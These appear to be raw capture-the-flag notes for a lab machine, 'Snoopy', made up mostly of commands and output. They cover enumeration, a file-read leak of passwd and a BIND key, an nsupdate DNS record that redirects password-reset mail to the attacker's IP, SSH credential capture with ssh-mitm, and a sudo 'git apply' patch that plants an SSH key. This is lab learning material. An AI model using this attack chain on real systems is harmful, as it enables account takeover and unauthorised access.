## Enum
```bash
nmap -Pn -sC -sV 10.10.11.212 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-21 22:17 IST
Nmap scan report for 10.10.11.212
Host is up (0.043s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.59 seconds
```
```bash
dirsearch -u http://10.10.11.212

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/10.10.11.212/_23-07-21_22-19-59.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-07-21_22-19-59.log

Target: http://10.10.11.212/

[22:19:59] Starting:
[22:20:06] 200 -   16KB - /about.html
[22:20:10] 403 -  564B  - /assets/
[22:20:10] 301 -  178B  - /assets  ->  http://10.10.11.212/assets/
[22:20:12] 200 -   10KB - /contact.html
[22:20:15] 301 -  178B  - /forms  ->  http://10.10.11.212/forms/
[22:20:17] 200 -   23KB - /index.html
[22:21:57] 200 -   11MB - /download
[22:21:58] 200 -   11MB - /download.php

Task Completed

```
```bash
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt \
  -u "http://snoopy.htb" \
  -H "Host: FUZZ.snoopy.htb" -mc all -fs 23418

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snoopy.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
 :: Header           : Host: FUZZ.snoopy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 23418
________________________________________________

[Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 46ms]
    * FUZZ: mm
```
```bash
grep sh $ passwd
grep: $: No such file or directory
passwd:root:x:0:0:root:/root:/bin/bash
passwd:sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
passwd:cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
passwd:sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
passwd:lpelt:x:1003:1004::/home/lpelt:/bin/bash
passwd:cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
passwd:vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```
```bash
dig AXFR snoopy.htb @10.10.11.212

; <<>> DiG 9.18.16-1-Debian <<>> AXFR snoopy.htb @10.10.11.212
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 140 msec
;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
;; WHEN: Fri Jul 21 22:52:05 IST 2023
;; XFR size: 11 records (messages 1, bytes 325)
```
```bash
go run main.go
Enter file location: /etc/bind/named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtc**************************************";
};
```
```bash
cat commands
server 10.10.11.212 53
key hmac-sha256:rndc-key BEqUtce*************************************
zone snoopy.htb
update add mail.snoopy.htb 86400 A 10.10.14.218
send
quit
```
```bash
nsupdate commands
```
```bash
dig +short mail.snoopy.htb @10.10.11.212
10.10.14.218
```
```bash
python3 -m smtpd -c DebuggingServer -n 10.10.14.218:25
/home/blnkn/.pyenv/versions/3.10.0/lib/python3.10/smtpd.py:104: DeprecationWarning: The asyncore module is deprecated. The recommended replacement is asyncio
  import asyncore
/home/blnkn/.pyenv/versions/3.10.0/lib/python3.10/smtpd.py:105: DeprecationWarning: The asynchat module is deprecated. The recommended replacement is asyncio
  import asynchat
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Precedence: bulk'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'Message-ID: <b9pkjm7qh3j73ssg-1689978382@mm.snoopy.htb>'
b'Auto-Submitted: auto-generated'
b'Date: Fri, 21 Jul 2023 22:26:22 +0000'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'To: cschultz@snoopy.htb'
b'Subject: [Mattermost] Reset your password'
b'Content-Transfer-Encoding: 8bit'
b'Content-Type: multipart/alternative;'
b' boundary=c09f962afb7f4dbacef4dde1e9f23bddc911a2a68839924017c873cee4f4'
b'X-Peer: 10.10.11.212'
b''
b'--c09f962afb7f4dbacef4dde1e9f23bddc911a2a68839924017c873cee4f4'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dcrigo='
b'topdsd9iczhx5xhitypt4wwqnqsduz4fhmuet4c7tbqmwka95jfjwyaw8nh )'
b''
```
```
http://mm.snoopy.htb/reset_password_complete?token=3Dcrigo=topdsd9iczhx5xhitypt4wwqnqsduz4fhmuet4c7tbqmwka95jfjwyaw8nh
```
removed the 3d and the =
```
http://mm.snoopy.htb/reset_password_complete?token=7919jpuw858nosbwznddtjkyeg99zwkg4pxqpw9ybtpjxkf6cuqmkq7gdia77kdx
```

```bash
ssh-mitm server --remote-host snoopy.htb --listen-port 2222
───────────────────────────────── SSH-MITM - ssh audits made simple ─────────────────────────────────
Version: 3.0.2
License: GNU General Public License v3.0
Documentation: https://docs.ssh-mitm.at
Issues: https://github.com/ssh-mitm/ssh-mitm/issues
─────────────────────────────────────────────────────────────────────────────────────────────────────
generated temporary RSAKey key with 2048 bit length and fingerprints:
   MD5:d5:88:ea:14:0f:e3:46:28:c1:25:43:1b:b2:80:75:f1
   SHA256:elkNMTo5YyqyJuZJJfJxnNkUrmWyCqGvv5zwwUg5Rto
   SHA512:fpLNhFUAr0Nec/ieRcwbJdh0+Rajj2PDE3Sj8IWC4mKRyQeL1GQr+TvqatBBPM8IRkTNTUFTTauUSDzwTNbUPQ
listen interfaces 0.0.0.0 and :: on port 2222
────────────────────────────────────── waiting for connections ──────────────────────────────────────
[07/22/23 10:56:33] INFO     ℹ session 23cd65a9-fcc0-40db-b93e-6f853a633b6b created
                    INFO     ℹ client information:
                               - client version: ssh-2.0-paramiko_3.1.0
                               - product name: Paramiko
                               - vendor url:  https://www.paramiko.org/
                             ⚠ client audit tests:
                               * client uses same server_host_key_algorithms list for unknown and
                             known hosts
                               * Preferred server host key algorithm: ssh-ed25519
[07/22/23 10:56:34] INFO     Remote authentication succeeded
                                     Remote Address: snoopy.htb:22
                                     Username: cbrown
                                     Password: sn00ped*************
                                     Agent: no agent
                    INFO     ℹ 23cd65a9-fcc0-40db-b93e-6f853a633b6b - local port
                             forwading
                             SOCKS port: 36593
                               SOCKS4:
                                 * socat: socat TCP-LISTEN:LISTEN_PORT,fork
                             socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,socksport=36593
                                 * netcat: nc -X 4 -x localhost:36593 address port
                               SOCKS5:
                                 * netcat: nc -X 5 -x localhost:36593 address port
                    INFO     got ssh command: ls -la
[07/22/23 10:56:35] INFO     ℹ 23cd65a9-fcc0-40db-b93e-6f853a633b6b - session started
                    INFO     got remote command: ls -la
                    INFO     remote command 'ls -la' exited with code: 0
                    ERROR    Socket exception: Connection reset by peer (104)
                    INFO     ℹ session 23cd65a9-fcc0-40db-b93e-6f853a633b6b closed
```
```bash
cbrown@snoopy:~$ id
uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)
```
```bash
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown:
Sorry, try again.
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```
```bash
cbrown@snoopy:~/repo$ find / -user sbrown 2>/dev/null
/home/sbrown
/home/cbrown/repo/mio2
/home/cbrown/repo/mio2/authorized_keys
```
```bash
cat addkey
diff --git a/mio2/authorized_keys b/mio2/authorized_keys
index 05a08d6..d984dab 100644
--- a/mio2/authorized_keys
+++ b/mio2/authorized_keys
@@ -1 +1,3 @@
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCp2In5V5cm8cGkJL+iPcT6CmRu/LBS6qjTFryVEtNSvCe4vME2yUiqU4kfuUXf/tI3g3YWfRJO5O5PAxZSW9ssXtRU3R47KcDXffccwYLtKhNTcRr+pbXvMpfhxJPfRlM3Ug09Yv/NxknO4QHE9ylqo4/CvmzB+hhyLYt2qHR0CYR2x494UQ5CtNJ4tku9NVxAxcyEgG3dt5FPvybHILfC5iZLpZdI5+AbRH6Y6JUqNswBRd9CR7GlYDVM/FdFQudCrWiFWFfOI3RHxZQ032ehrzQUVh+XOrIwOo6Yi6qO5wXSWowQ5m6CJyKErP64gtK50nw6Rg4cwCno2XDMT4Gww/u4YpnC+zVMW1jnqsE//Y5OyY5Csbb2rss4Kg90Pe9bV/LF534ZtXOBt9TSNCH3incE1ZGnbnLg0/4wCTa0xFzCTrMgGiULp28pT/Mng0bqQdIx7Ecog5uq6auEyaVSl++mqetv2yHa1UDxTfh1qjc+X2RDcVWE17M6QCXo4A4q9SOiwiFk50wldvCc4w12FoyyZwIL0hLxK4hIzcrBU0x/RAUknJHCricwHJJXVfPyj83HioQIEPiezbTfoEEVWq6CApKhQoDiKrveWkjLVoiFPHiuXoGuDxhMhlQfVW6DZRrsqUTzOdlSxAUGDKDb+02ff/G5RCMmZd4X3vjBPw== sbrown@snoopy.htb
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNO5SP8lnlQVttOUf1a+dnSOLuErARU0EjxZsBVy1vdxep2xOMiGVuX9cDBAABoVTmEJw52Giii9qgtQZ2yHWa1vi1SmgyFZtF+A8Aer9+TO+T2XA9uhXiLtJW/mkyKJabX1Fxgjn6T5myorx3pZzvyxGgizxT4CZKR6AqhU6kI3LGYT7XzNpyVo0qyQ0OAa4y30DK3Wnalod/2yREUIooYn1D0lbBNyN1RqAPQu7+bE8U1ZxVD8S1+60YsGCYypyb/AVe3OZYVdHcU0LqdoaD3MUB8oeLRp4pkWIsRq/LdAN37j8N6J98ff2w29ixFR40m1YcgRAUYG1E0bb1dXoKm2umPxjcbl68DI6T9SWeIYIfoO/+xTPYsDMx6peID4HEMp1P/gbZR9elkS+oOaSy/K4Wn0V0WNrjb6D0xD98HqGruxLs3NZGMhPbcd/mYD+opVabS/4sbfWJNaBe7BiGoCczFvXeFRMvDuoMCRvMrpkvQwHp7wUudRuoAqDU+Ok= blnkn@Kolossus
```
```bash
sudo -u sbrown git apply -v addkey
Checking patch mio2/authorized_keys...
Applied patch mio2/authorized_keys cleanly.
```

```bash
```
```bash
```

